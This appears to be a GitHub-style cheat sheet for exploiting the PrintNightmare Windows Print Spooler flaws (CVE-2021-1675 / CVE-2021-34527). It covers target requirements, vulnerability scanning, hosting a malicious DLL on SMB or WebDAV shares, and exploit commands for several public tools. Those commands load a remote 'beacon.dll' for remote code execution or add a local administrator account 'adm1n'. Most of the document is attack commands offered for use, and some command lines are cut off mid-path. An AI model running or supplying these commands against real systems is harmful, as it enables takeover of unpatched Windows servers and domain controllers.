# Print Nightmare CVE-2021-1675 / CVE-2021-34527

### The DLL will be stored in C:\Windows\System32\spool\drivers\x64\3\ . The exploit will execute the DLL either from the local filesystem or a remote share.

## Requirements:

 - Spooler Service enabled (MANDATORY)

 - Server with patches < June 2021

 - DC with Pre Windows 2000 Compatiblity group

 - Server with registry key HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall = (DWORD) 1

 - Server with registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA = (DWORD) 0

## Detect the vulnerability:

#### 1) Impacket rpcdump

 - python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'

#### 2) It Was All A Dream (Github repo: https://github.com/byt3bl33d3r/ItWasAllADream)

 - git clone https://github.com/byt3bl33d3r/ItWasAllADream

 - cd ItWasAllADream && poetry install && poetry shell

 - itwasalladream -u user -p Password123 -d domain 10.10.10.10/24

### OR

 - docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10

## Payload Hosting:

#### 1) The payload can be hosted on Impacket SMB Server since PR #1109:

 - python3 ./smbserver.py share /tmp/smb/

#### 2) Using Invoke-BuildAnonymousSMBServer (Admin rights required on host):

 - Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer

#### 3) Using WebDav with SharpWebServer (Doesn't require admin rights):

 - SharpWebServer.exe port=8888 dir=c:\users\public verbose=true

### When using WebDav instead of SMB, you must add @[PORT] to the hostname in the URI, e.g.: \\172.16.1.5@8888\Downloads\beacon.dll WebDav client must be activated on exploited target. By default it is not activated on Windows workstations (you have to net start webclient ) and it's not installed on servers. Here is how to detect activated webdav:

 - cme smb -u user -p password -d domain.local -M webdav [TARGET]

## Trigger the exploit

#### 1) SharpNightmare

### Requires a modified Impacket: https://github.com/cube0x0/impacket

 - python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\
 
 - python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'

### Local Privilege Escalation (LPE)

 - SharpPrintNightmare.exe C:\addCube.dll

### RCE using existing context

 - SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\
 
### RCE using runas /netonly

 - SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32

#### 2) Invoke-Nightmare

### LPE only (ps1 + dll)

 - Import-Module .\cve-2021-1675.ps1

 - Invoke-Nightmare (add user 'adm1n'/'P@ssw0rd' in the local admin group by default)

 - Invoke-Nightmare -DriverName "DRIVER_NAME" -NewUser "NEW_USER" -NewPassword "NEW_PASS"

 - Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"

#### 3) Mimikatz v2.2.0-20210709+

### LPE 

 - misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll

### RCE

 - misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:DOMAIN

#### 4) PrintNightmare by @outflanknl

 - PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain]

## Debug Information

### Error --> Message --> Debug

 - 0x5 --> rpc_s_access_denied --> Permissions on the file in the SMB share

 - 0x525 --> ERROR_NO_SUCH_USER --> The specified account does not exist

 - 0x180 --> unknown error code --> Share is not SMB2
